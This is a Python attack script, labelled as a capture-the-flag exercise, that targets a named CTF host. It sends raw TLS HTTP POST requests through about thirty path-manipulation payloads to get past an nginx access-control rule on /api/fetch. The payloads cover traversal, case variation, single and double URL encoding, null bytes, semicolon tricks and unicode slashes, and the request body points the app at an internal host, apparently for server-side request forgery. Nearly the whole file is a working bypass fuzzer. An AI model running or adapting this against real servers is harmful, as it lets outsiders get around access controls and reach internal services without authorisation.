#!/usr/bin/env python3
"""
Nginx ACL Bypass Techniques for CTF Challenge
Target: u8p0uags08m1.ctfhub.io
"""

import socket
import ssl
import sys

TARGET = "u8p0uags08m1.ctfhub.io"
PORT = 443

def send_raw_request(request):
    """Send a raw HTTP request over TLS"""
    context = ssl.create_default_context()
    with socket.create_connection((TARGET, PORT)) as sock:
        with context.wrap_socket(sock, server_hostname=TARGET) as ssock:
            ssock.send(request.encode())
            response = b""
            while True:
                data = ssock.recv(4096)
                if not data:
                    break
                response += data
    return response.decode(errors='replace')

def test_bypass(path, description):
    """Test a path bypass technique"""
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: 27\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f'{{"endpoint":"http://httpd/"}}'
    )
    
    response = send_raw_request(request)
    first_line = response.split('\r\n')[0] if response else "No response"
    
    # Check if we bypassed nginx
    if "403 Forbidden" in response and "nginx/1.18.0" in response:
        status = "BLOCKED (nginx ACL)"
    elif "403 Forbidden" in response and "nginx/1.28.0" in response:
        status = "BLOCKED (external nginx)"
    elif "404" in first_line:
        status = "BYPASS! (app 404)"
    elif "405" in first_line:
        status = "BYPASS! (app 405)"
    elif "200" in first_line:
        status = "SUCCESS!"
    elif "400" in first_line:
        status = "Bad request"
    else:
        status = first_line
    
    print(f"[{status:25}] {description}: {path}")
    return "BYPASS" in status or "SUCCESS" in status

def main():
    print("=" * 70)
    print("Nginx ACL Bypass Techniques")
    print("=" * 70)
    
    bypasses = [
        # Basic paths
        ("/api/fetch", "Direct path"),
        ("/api/fetch/", "Trailing slash"),
        ("/api/fetch/.", "Trailing dot"),
        ("/api/fetch/..", "Trailing dotdot"),
        ("/api/fetch/x", "With suffix"),
        ("/api/fetch/test", "With subpath"),
        
        # Path traversal
        ("/api/x/../fetch", "Basic traversal"),
        ("/api/systems/../fetch", "Traversal via systems"),
        ("/api/fetch/../fetch", "Double path"),
        ("/api/fetch/a/../", "Traversal at end"),
        
        # Case variations
        ("/API/FETCH", "All uppercase"),
        ("/Api/Fetch", "Title case"),
        ("/api/Fetch", "Partial uppercase 1"),
        ("/Api/fetch", "Partial uppercase 2"),
        
        # URL encoding
        ("/api%2ffetch", "Encoded slash"),
        ("/api/fetch%20", "Trailing encoded space"),
        ("/api/fetch%00", "Null byte"),
        ("/api/fetch%09", "Tab"),
        
        # Special characters
        ("/api/fetch;", "Semicolon"),
        ("/api/fetch#", "Hash"),
        ("/api;/fetch", "Semicolon middle"),
        ("/api/..;/fetch", "Semicolon traversal"),
        ("/api/systems/..;/fetch", "Complex semicolon"),
        
        # Double encoding
        ("/api%252ffetch", "Double encoded slash"),
        ("/api/fetch%252e", "Double encoded dot"),
        
        # Unicode
        ("/api\uff0ffetch", "Fullwidth slash"),
        ("/api/fetch\u200b", "Zero-width space"),
        
        # Other
        ("//api/fetch", "Leading double slash"),
        ("/./api/fetch", "Leading dot-slash"),
        ("/../api/fetch", "Leading dotdot-slash"),
    ]
    
    success_count = 0
    for path, desc in bypasses:
        try:
            if test_bypass(path, desc):
                success_count += 1
        except Exception as e:
            print(f"[ERROR] {desc}: {e}")
    
    print()
    print(f"Found {success_count} bypass techniques that reach the app")
    print()
    print("Note: 'BYPASS' means nginx ACL was bypassed, but the app may return 404/405")
    print("      We need a technique that both bypasses nginx AND matches the app route")

if __name__ == "__main__":
    main()
